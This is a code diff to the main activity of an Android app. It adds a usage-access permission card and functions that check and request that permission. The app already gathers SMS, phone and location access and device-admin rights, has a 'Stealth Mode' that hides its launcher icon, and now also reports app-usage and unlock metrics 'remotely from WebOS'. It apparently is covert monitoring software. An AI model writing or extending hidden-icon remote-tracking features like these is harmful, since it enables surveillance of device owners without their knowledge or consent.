@@ -13,6 +13,7 @@ import android.os.Build
 import android.os.Bundle
 import android.os.Environment
 import android.os.PowerManager
+import android.app.AppOpsManager
 import android.provider.Settings
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
@@ -55,6 +56,7 @@ class MainActivity : ComponentActivity() {
     private val isPhoneSmsGrantedState = mutableStateOf(false)
     private val isLocationGrantedState = mutableStateOf(false)
     private val isAdminActiveState = mutableStateOf(false)
+    private val isUsageAccessGrantedState = mutableStateOf(false)
     private val isStealthActiveState = mutableStateOf(false)
 
     private val requestPermissionsLauncher = registerForActivityResult(
@@ -123,6 +125,7 @@ class MainActivity : ComponentActivity() {
             val isPhoneSmsGranted by isPhoneSmsGrantedState
             val isLocationGranted by isLocationGrantedState
             val isAdminActive by isAdminActiveState
+            val isUsageAccessGranted by isUsageAccessGrantedState
             val isStealthActive by isStealthActiveState
 
             DisposableEffect(Unit) {
@@ -557,6 +560,14 @@ class MainActivity : ComponentActivity() {
                                     onGrantClick = { requestDeviceAdmin() }
                                 )
 
+                                // 9. Usage Access (Screen Time & Wellbeing)
+                                PermissionCard(
+                                    title = "Usage Access (Screen Time & Wellbeing)",
+                                    description = "Allows tracking daily app usage times, device lock/unlock count, and digital wellbeing metrics remotely from WebOS.",
+                                    isGranted = isUsageAccessGranted,
+                                    onGrantClick = { requestUsageAccess() }
+                                )
+
                                 // 9. Stealth Mode (Hide Launcher App Icon)
                                 Card(
                                     modifier = Modifier.fillMaxWidth(),
@@ -690,6 +701,7 @@ class MainActivity : ComponentActivity() {
             arrayOf(android.Manifest.permission.ACCESS_FINE_LOCATION, android.Manifest.permission.ACCESS_COARSE_LOCATION)
         )
         isAdminActiveState.value = checkDeviceAdmin()
+        isUsageAccessGrantedState.value = checkUsageAccess()
         isStealthActiveState.value = checkStealthActive()
     }
 
@@ -747,6 +759,49 @@ class MainActivity : ComponentActivity() {
             )
         }
         startActivity(intent)
+    }
+
+    private fun checkUsageAccess(): Boolean {
+        return try {
+            val appOps = getSystemService(Context.APP_OPS_SERVICE) as? AppOpsManager ?: return false
+            val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                appOps.unsafeCheckOpNoThrow(
+                    AppOpsManager.OPSTR_GET_USAGE_STATS,
+                    android.os.Process.myUid(),
+                    packageName
+                )
+            } else {
+                @Suppress("DEPRECATION")
+                appOps.checkOpNoThrow(
+                    AppOpsManager.OPSTR_GET_USAGE_STATS,
+                    android.os.Process.myUid(),
+                    packageName
+                )
+            }
+            mode == AppOpsManager.MODE_ALLOWED
+        } catch (e: Exception) {
+            false
+        }
+    }
+
+    private fun requestUsageAccess() {
+        try {
+            val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                    data = Uri.fromParts("package", packageName, null)
+                }
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+            startActivity(intent)
+        } catch (e: Exception) {
+            try {
+                startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                })
+            } catch (e2: Exception) {
+                Toast.makeText(this, "Please open Settings > Special app access > Usage access", Toast.LENGTH_LONG).show()
+            }
+        }
     }
 
     private fun checkStoragePermission(): Boolean {
@@ -870,4 +925,5 @@ class MainActivity : ComponentActivity() {
         nsdManager.unregisterService()
     }
 }
+
 
